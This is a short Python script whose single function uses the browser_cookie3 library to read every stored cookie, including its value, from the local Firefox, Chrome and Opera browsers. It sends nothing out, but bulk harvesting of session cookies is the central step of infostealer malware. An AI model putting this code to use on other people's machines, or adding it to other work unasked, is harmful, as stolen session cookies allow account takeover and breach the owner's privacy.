import browser_cookie3
#Updating... 


def get_browser_cookies():
    cookies = []

    for cookie in browser_cookie3.firefox():
        cookie_info = {
            'domain': cookie.domain,
            'name': cookie.name,
            'value': cookie.value,
            'expires': cookie.expires
        }
        cookies.append(cookie_info)

    for cookie in browser_cookie3.chrome():
        cookie_info = {
            'domain': cookie.domain,
            'name': cookie.name,
            'value': cookie.value,
            'expires': cookie.expires
        }
        cookies.append(cookie_info)

    for cookie in browser_cookie3.opera():
        cookie_info = {
            'domain': cookie.domain,
            'name': cookie.name,
            'value': cookie.value,
            'expires': cookie.expires
        }
        cookies.append(cookie_info)

    return cookies
